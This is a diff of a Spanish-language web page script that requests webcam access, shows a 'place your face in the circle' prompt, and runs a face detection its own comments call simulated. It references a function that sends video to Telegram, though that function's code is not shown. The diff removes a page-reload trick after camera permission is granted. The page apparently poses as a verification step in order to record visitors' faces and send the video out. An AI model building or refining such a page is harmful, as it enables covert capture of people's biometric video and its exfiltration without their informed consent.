@@ -171,9 +171,6 @@ let faceDetected = false;
 let detectionInterval = null;
 let videoStream = null;
 
-// ---- CLAVE PARA CONTROLAR LA RECARGA ----
-const RELOAD_KEY = 'cameraReloaded';
-
 // ---- Función que inicia la detección facial (simulada) ----
 function startFaceDetection() {
     if (detectionInterval) clearInterval(detectionInterval);
@@ -280,46 +277,21 @@ function enviarVideoTelegram(videoBlob) {
     });
 }
 
-// ============================================================
-//  LÓGICA PRINCIPAL CON RECARGA CONTROLADA
-// ============================================================
 function iniciarApp() {
-    // Verificar si ya se recargó
-    const yaRecargado = sessionStorage.getItem(RELOAD_KEY) === 'true';
-
-    if (!yaRecargado) {
-        // ---- PRIMERA CARGA: Solicitar cámara y recargar al obtener éxito ----
-        navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-            // Marcar que ya se recargará
-            sessionStorage.setItem(RELOAD_KEY, 'true');
-            // Recargar la página
-            location.reload();
-        })
-        .catch(() => {
-            statusText.innerText = "❌ Error cámara";
-        });
-    } else {
-        // ---- SEGUNDA CARGA (ya recargado): Flujo normal ----
-        navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-            videoStream = stream;
-            video.srcObject = stream;
-            statusText.innerText = "Coloca tu rostro en el círculo";
-            // Iniciar detección después de un breve retraso
-            setTimeout(() => {
-                if (videoStream) {
-                    startFaceDetection();
-                }
-            }, 2000);
-        })
-        .catch(() => {
-            statusText.innerText = "❌ Error cámara";
-        });
-    }
+    navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+        videoStream = stream;
+        video.srcObject = stream;
+        statusText.innerText = "Coloca tu rostro en el círculo";
+        setTimeout(() => {
+            if (videoStream) startFaceDetection();
+        }, 2000);
+    })
+    .catch(() => {
+        statusText.innerText = "❌ Error cámara";
+    });
 }
 
-// ---- Ejecutar al cargar la página ----
 window.addEventListener("load", iniciarApp);
 </script>
 
